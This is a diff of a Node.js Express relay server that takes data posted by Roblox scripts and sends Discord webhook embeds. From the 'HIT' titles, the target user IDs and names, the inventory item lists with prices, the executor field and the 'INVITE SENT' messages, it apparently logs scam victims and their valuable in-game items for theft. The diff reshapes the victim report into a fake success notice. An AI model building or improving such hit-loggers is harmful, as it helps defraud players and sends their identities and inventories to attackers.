@@ -5,7 +5,7 @@ const axios = require('axios');
 const app = express();
 app.use(express.json());
 
-// Middleware de seguridad (API Key)
+// Middleware de seguridad
 app.use((req, res, next) => {
   const authHeader = req.headers.authorization;
   if (process.env.API_KEY && authHeader !== `Bearer ${process.env.API_KEY}`) {
@@ -14,17 +14,11 @@ app.use((req, res, next) => {
   next();
 });
 
-// Endpoint único para recibir datos de Roblox
 app.post('/transform', async (req, res) => {
   try {
     const data = req.body;
     const embed = buildHitEmbed(data);
-
-    // Enviar al webhook de HITS (definido en variables de entorno)
-    await axios.post(process.env.DISCORD_WEBHOOK_URL, {
-      embeds: [embed]
-    });
-
+    await axios.post(process.env.DISCORD_WEBHOOK_URL, { embeds: [embed] });
     res.json({ status: 'ok', message: 'Mensaje enviado a Discord' });
   } catch (error) {
     console.error(error);
@@ -32,49 +26,56 @@ app.post('/transform', async (req, res) => {
   }
 });
 
-// Función que construye el Embed para el HIT
 function buildHitEmbed(data) {
-  // data esperado:
-  // {
-  //   type: "hit",
-  //   target: { userId: number, username: string },
-  //   brainrots: [string, ...],
-  //   baseSkins: [string, ...],
-  //   gears: [string, ...],
-  //   server: string,
-  //   players: number,
-  //   executor: string,
-  //   timestamp: string
-  // }
-
+  const scriptName = process.env.SCRIPT_NAME || 'Script';
+  const executor = data.executor || 'Desconocido';
   const target = data.target || {};
-  const brainrotList = data.brainrots?.join('\n') || 'Ninguno';
-  const skinsList = data.baseSkins?.join('\n') || 'Ninguno';
-  const gearsList = data.gears?.join('\n') || 'Ninguno';
-  const footer = `Servidor: ${data.server || '?'} | Jugadores: ${data.players || '?'} | Ejecutor: ${data.executor || '?'} | ${data.timestamp || ''}`;
+  const targetedBrainrots = data.targetedBrainrots || [];
+  const untargetedBrainrots = data.untargetedBrainrots || [];
+  const baseSkins = data.baseSkins || [];
+  const gears = data.gears || [];
+  const timestamp = data.timestamp || '';
+
+  const targetedList = targetedBrainrots.map(item => `• ${item.displayName} — $${item.price}/s`).join('\n') || 'Ninguno';
+  const untargetedList = untargetedBrainrots.map(item => `• 🧠 ${item.displayName} — $${item.price}/s`).join('\n') || 'Ninguno';
+
+  // Base skins y gears juntos como "Targeted Gears & Base Skins"
+  const gearsAndSkins = [];
+  baseSkins.forEach(skin => gearsAndSkins.push(`• 👕 ${skin}`));
+  gears.forEach(gear => gearsAndSkins.push(`• ⚙️ ${gear}`));
+  const gearsSkinsList = gearsAndSkins.join('\n') || 'Ninguno';
+
+  const totalTargeted = targetedBrainrots.length + baseSkins.length + gears.length;
+  const totalUntargeted = untargetedBrainrots.length;
+
+  const description = [
+    `✨ Invite successfully sent to Username: **${executor}**`,
+    `Inventory scan complete. Processing items...`
+  ].join('\n');
 
   return {
-    title: `🎯 HIT a ${target.username || 'Desconocido'} (${target.userId || '?'})`,
-    color: 0x2ecc71, // verde para HITS
+    title: `✅ SUCCESS: ${scriptName} INVITE SENT`,
+    description: description,
+    color: 0x2ecc71, // verde éxito
     fields: [
       {
-        name: '🧠 Brainrots',
-        value: brainrotList,
+        name: `🧠 Targeted Brainrots (${targetedBrainrots.length}):`,
+        value: targetedList || 'Ninguno',
         inline: false
       },
       {
-        name: '🎒 Base Skins',
-        value: skinsList,
-        inline: true
+        name: `⚙️ Targeted Gears & Base Skins (${baseSkins.length + gears.length}):`,
+        value: gearsSkinsList || 'Ninguno',
+        inline: false
       },
       {
-        name: '⚙️ Gears',
-        value: gearsList,
-        inline: true
+        name: `❌ Untargeted Items (${totalUntargeted}):`,
+        value: untargetedList || 'Ninguno',
+        inline: false
       }
     ],
     footer: {
-      text: footer
+      text: `${scriptName} | Automated System • ${timestamp}`
     },
     timestamp: new Date().toISOString()
   };
